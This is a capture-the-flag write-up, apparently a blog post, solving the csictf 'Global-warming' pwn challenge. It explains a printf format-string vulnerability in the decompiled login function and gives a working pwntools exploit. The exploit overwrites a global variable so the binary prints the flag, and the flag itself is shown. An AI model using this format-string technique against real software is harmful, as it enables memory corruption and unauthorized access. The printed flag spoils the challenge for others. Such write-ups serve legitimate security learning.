---
layout: post
title: "Global-warming"
author: "AnandSaminathan"
tags: ['Pwn']
---

**Files**
- [global-warming]({{site.baseurl}}/assets/Global-warming/global-warming)

## Solution

The binary contains two functions - `main` and `login`, the `main` function reads an input and passes it to `login`. On decompiling login using Ghidra:
```cpp
void login(int32_t arg_ch)
{
    int32_t unaff_EBX;
    int32_t var_4h;
    
    __x86.get_pc_thunk.bx();
    printf(arg_ch);
    if (admin == 0xb4dbabe3) {
        system("cat flag.txt");
    } else {
        printf("You cannot login as admin.");
    }
    return;
}

```

It is clear that `printf` prints the input without any format string, so the binary has format string vulnerability. The input has to some how overwrite `admin` to `0xb4dbabe3`  which is a global variable at `0x804c02c`. This can be done using `%n` or `%hn` format string. But instead it is easier to do it using pwntools' `fmstr_payload` function, which only requires the location of format string from the stack pointer and \<address, value> pairs of the variables to overwritten as a dict.
In this case, the format string is 12 positions away from the stack pointer (found manually by using `%x`'s as inputs). This script worked:

```python
from pwn import *

elf = ELF('./global-warming')
io = remote("chall.csivit.com", 30023)

admin = elf.symbols['admin']
magic = 0xb4dbabe3

io.sendline(fmtstr_payload(12, {admin : magic}))
io.recvline()
print(io.recvall())
```

## Flag

```
csictf{n0_5tr1ng5_@tt@ch3d}
```
